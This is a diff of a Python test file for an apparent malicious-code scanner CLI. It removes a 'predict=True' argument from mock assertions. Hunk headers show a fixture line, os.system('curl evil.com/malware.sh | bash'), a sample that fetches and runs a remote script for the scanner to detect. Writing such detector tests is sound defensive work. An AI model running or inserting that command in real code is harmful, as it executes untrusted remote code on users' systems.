@@ -65,7 +65,6 @@ class TestBasicCLI:
                         mock_process.assert_called_once_with(
                             input_path=test_file,
                             accepted_extensions=SUPPORTED_EXTENSIONS,
-                            predict=True,
                             silent=True,
                             malicious_threshold=0.7,
                             on_finding=None,
@@ -316,7 +315,6 @@ os.system('curl evil.com/malware.sh | bash')
                         mock_process.assert_called_once_with(
                             input_path=tmp_path,
                             accepted_extensions=SUPPORTED_EXTENSIONS,
-                            predict=True,
                             silent=True,
                             malicious_threshold=0.7,
                             on_finding=None,
@@ -375,7 +373,6 @@ os.system('curl evil.com/malware.sh | bash')
                         mock_process.assert_called_once_with(
                             input_path=test_file,
                             accepted_extensions=SUPPORTED_EXTENSIONS,
-                            predict=True,
                             silent=True,
                             malicious_threshold=0.9,
                             on_finding=None,
@@ -434,7 +431,6 @@ os.system('curl evil.com/malware.sh | bash')
                         mock_process.assert_called_once_with(
                             input_path=tmp_path,
                             accepted_extensions=["py", "pyw"],
-                            predict=True,
                             silent=True,
                             malicious_threshold=0.7,
                             on_finding=None,
